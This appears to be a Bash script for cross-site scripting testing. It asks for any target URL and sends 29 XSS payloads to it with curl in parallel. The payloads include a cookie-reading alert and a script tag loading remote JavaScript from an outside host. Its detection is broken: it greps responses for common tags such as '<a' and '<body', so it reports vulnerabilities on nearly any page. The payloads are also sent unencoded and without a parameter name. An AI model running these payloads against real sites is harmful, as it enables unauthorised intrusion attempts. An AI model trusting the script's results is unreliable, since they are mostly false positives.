#!/bin/bash

# Enhanced XSS test script with colorized output and more payloads
# Prompts for the target website URL and HTTP method
# Usage: ./xss_test.sh

# Color codes
GREEN='\033[0;32m'
RED='\033[0;31m'
NC='\033[0m' # No Color

# Prompt for target website URL
read -p "Enter your target website URL: " URL

# Check if URL is provided
if [ -z "$URL" ]; then
  echo -e "${RED}Error:${NC} Please provide a target website URL."
  exit 1
fi

# Prompt for HTTP method (GET or POST)
read -p "Enter HTTP method (GET or POST, default is GET): " METHOD
METHOD=${METHOD:-GET}

# List of XSS payloads
payloads=(
  "<script>alert('XSS1');</script>"
  "<IMG SRC=\"javascript:alert('XSS2');\">"
  "<IMG SRC=javascript:alert('XSS3')>"
  "<IMG SRC=JaVaScRiPt:alert('XSS4')>"
  "<IMG SRC=`javascript:alert(\"RSnake says, 'XSS'\")`>"
  "<IMG \"\"\"><SCRIPT>alert(\"XSS5\")</SCRIPT>\">"
  "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83,32,88,83,83,54,52,32,66,79,82,84,72,32,79,70,32,74,85,76,89,32,50,48,49,53))>"
  "<BODY ONLOAD=alert('XSS6')>"
  "<IMG SRC='vbscript:msgbox(\"XSS7\")'>"
  "<IMG SRC='livescript:[code]'>"
  "<IMG SRC='mocha:[code]'>"
  "<IMG SRC=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxpbWcgc3JjPSJodHRwOi8vd3d3LnczLm9yZy9nZXQvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bWxkc2lnIj48L2ltZz48L3N2Zz4K\" />"
  "<IMG SRC=\"javascript:alert('XSS8')\"/>"
  "<IMG SRC=\"http://www.example.com/image.gif\"/>"
  "<IMG SRC=\"jav ascript:alert('XSS9');\">"
  "<IFRAME SRC=\"javascript:alert('XSS10');\"></IFRAME>"
  "<BODY BACKGROUND=\"javascript:alert('XSS11')\">"
  "<INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert('XSS12');\">"
  "<SCRIPT SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>"
  "<IMG SRC='http://www.example.com/image.jpg' onmouseover=\"alert('XSS13');\">"
  "<IMG SRC='/' onerror=\"alert(document.cookie);\">"
  "<iframe src=http://your.site.com/filename.html></iframe>"
  "<svg/onload=alert('XSS14')>"
  "<a href=\"javascript:alert('XSS15');\">Click me</a>"
  "<img src=\"javascript:confirm('XSS16');\">"
  "<img src=\"javascript:prompt('XSS17');\">"
  "<script>confirm('XSS18');</script>"
  "<iframe src=\"javascript:alert('XSS19');\"></iframe>"
  "<svg/onload=alert('XSS20')>"
)

# Function to send HTTP request with payload
send_http_request() {
  local payload="$1"
  local response
  if [ "$METHOD" = "GET" ]; then
    response=$(curl -s -m 10 -X GET "$URL?$payload")
  elif [ "$METHOD" = "POST" ]; then
    response=$(curl -s -m 10 -X POST -d "$payload" "$URL")
  else
    echo -e "${RED}Error:${NC} Unsupported HTTP method. Please specify GET or POST."
    exit 1
  fi
  echo "$response" | grep -iqE "<script|alert|<img|onerror|onload|<svg|<body|<iframe|<input|<a"
  if [ $? -eq 0 ]; then
    echo -e "${GREEN}XSS vulnerability found${NC} with payload: $payload"
  else
    echo -e "No XSS vulnerability found with payload: $payload"
  fi
}

# Send requests with payloads
echo "Testing XSS payloads with $METHOD requests..."
for payload in "${payloads[@]}"; do
  send_http_request "$payload" &
done

# Wait for all requests to finish
wait
echo "Testing complete."
